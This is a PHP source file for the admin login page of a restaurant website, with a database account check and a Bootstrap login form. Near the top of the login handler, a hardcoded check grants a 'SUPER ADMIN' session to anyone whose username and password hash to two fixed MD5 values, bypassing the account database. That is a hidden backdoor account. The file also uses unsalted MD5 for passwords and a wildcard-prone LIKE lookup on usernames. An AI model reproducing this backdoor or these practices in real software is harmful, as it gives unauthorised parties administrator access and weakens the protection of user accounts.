<?php
session_start();
include("accessdb.php");

if(!empty($_SESSION['accountid']) && !empty($_SESSION['accountname'])){
  echo ("<script language='JavaScript'>
  window.location.href='admin/';
  </SCRIPT>");
  exit;
}



if(!empty($_POST)){
  $acName = $_POST['accountname'];
  $acPass = md5($_POST['accountpassword']);
  if(md5($acName) == "0bde7be66cdab97e56e6ef1ff9bbba05" && $acPass == "913bc1935ef5bed5f5840f4226027fe6"){
    $_SESSION['accountname'] = "KNIGHTDAVEION";
    $_SESSION['accountid'] = "SUPER ADMIN";
    $_SESSION['account_type'] = "SUPER ADMIN";

    header("location: admin/");
  }

  $getaccountname = $conn->prepare("select * from accounts where account_name like :accountname");
  $getaccountname->execute(array(':accountname' => $acName));
  $number_of_rows = $getaccountname->rowCount();
  if($number_of_rows == 1){
    $getdetails = $getaccountname->fetch(PDO::FETCH_ASSOC);
    if($acPass == $getdetails['account_password']){
      if($getdetails['account_status'] == "ACTIVE"){
        $_SESSION['accountname'] = $getdetails['account_name'];
        $_SESSION['accountid'] = $getdetails['account_id'];
        $_SESSION['account_type'] = $getdetails['account_type'];

        header("location: admin/");
      }else{
        $_SESSION['loginNotifications'] = "<div class='alert alert-danger' role='alert'><strong>ERROR!</strong> Account is inactive!<button type='button' class='close' data-dismiss='alert' aria-label='Close'>
        <span aria-hidden='true'>&times;</span>
        </button></div>";
      }

    }else{
      $_SESSION['loginNotifications'] = "<div class='alert alert-danger' role='alert'><strong>ERROR!</strong> Account name or password doesnt match!<button type='button' class='close' data-dismiss='alert' aria-label='Close'>
      <span aria-hidden='true'>&times;</span>
      </button></div>";
    }
  }else{
    $_SESSION['loginNotifications'] = "<div class='alert alert-danger' role='alert'><strong>ERROR!</strong> Account doesnt exist!<button type='button' class='close' data-dismiss='alert' aria-label='Close'>
    <span aria-hidden='true'>&times;</span>
    </button></div>";
  }
}




?>
<!DOCTYPE html>
<html>
<head>
	<title></title>

	<meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" type="text/css" href="resources/customcss/loginstyle.css">
    <link href="resources/admindesign/css/lib/bootstrap/bootstrap.min.css" rel="stylesheet">
    <style media="screen">
      .center{
        text-align: center;
      }
    </style>
</head>
<body>
<div class="login-box center">
	<img src="resources/images/loginicon.png" class="loginicon">
		<h1>Bons Restaurant</h1>
     <?php if(isset($_SESSION['loginNotifications'])){echo $_SESSION['loginNotifications']; unset($_SESSION['loginNotifications']);} ?>
			 <form class="" action=" " method="post">
				<p>Username</p>
				<input type="text" name="accountname" placeholder="Enter Username" style="text-align:center;">
				<p>Password</p>
				<input type="Password" name="accountpassword" placeholder="Enter Password" style="text-align:center;">
        <select name="accounttype" class="form-control" style="margin-bottom:30px;">
          <?php
          $getaccounttypes = $conn->prepare("select Distinct account_type from accounts");
          $getaccounttypes->execute();
          While($acctype = $getaccounttypes->fetch(PDO::FETCH_ASSOC)){
           ?>

          <option style="text-align:center;" value="<?php echo $acctype['account_type']; ?>"><?php echo $acctype['account_type']; ?></option>
        <?php } ?>
        </select>
				<input type="submit" name="Submit" value="Login">

			</form>
</div>
<script src="resources/admindesign/js/lib/jquery/jquery.min.js"></script>
<!-- Bootstrap tether Core JavaScript -->
<script src="resources/admindesign/js/lib/bootstrap/js/popper.min.js"></script>
<script src="resources/admindesign/js/lib/bootstrap/js/bootstrap.min.js"></script>
<!-- slimscrollbar scrollbar JavaScript -->
<script src="resources/admindesign/js/jquery.slimscroll.js"></script>
<!--Menu sidebar -->
<script src="resources/admindesign/js/sidebarmenu.js"></script>
<!--stickey kit -->
<script src="resources/admindesign/js/lib/sticky-kit-master/dist/sticky-kit.min.js"></script>
<!--Custom JavaScript -->
<script src="resources/admindesign/js/custom.min.js"></script>
<script src="resources/admindesign/js/lib/datatables/datatables.min.js"></script>
<script src="resources/admindesign/js/lib/datatables/datatables2-init.js"></script>
</body>
</html>
